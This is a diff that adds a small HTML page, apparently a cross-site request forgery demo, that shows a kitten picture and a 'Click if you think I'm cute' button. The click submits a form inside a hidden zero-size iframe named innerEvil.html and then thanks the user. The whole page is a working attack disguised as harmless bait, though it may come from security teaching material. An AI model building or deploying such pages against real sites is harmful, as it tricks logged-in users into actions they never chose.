@@ -1,0 +1,20 @@
+<html>
+<head>
+    <title>So Cute!</title>
+    <script language="JavaScript">
+        function doEvil(){
+            document.getElementById("evilFrame").contentWindow.document.getElementById("evilForm").submit();
+            var evilButton = document.getElementById("evilButton");
+            evilButton.innerText = "Thanks.. Meow!!!";
+            evilButton.disabled = true;
+        }
+    </script>
+</head>
+<body>
+
+<button style="font-size: 36pt" onclick="doEvil()" id="evilButton">Click if you think I'm cute!!! :D</button>
+
+<img src="cute_kitten_ducklings.jpg" style="max-width: 100%">
+<iframe width="0" height="0" frameborder="0" src="innerEvil.html" id="evilFrame"></iframe>
+</body>
+</html>
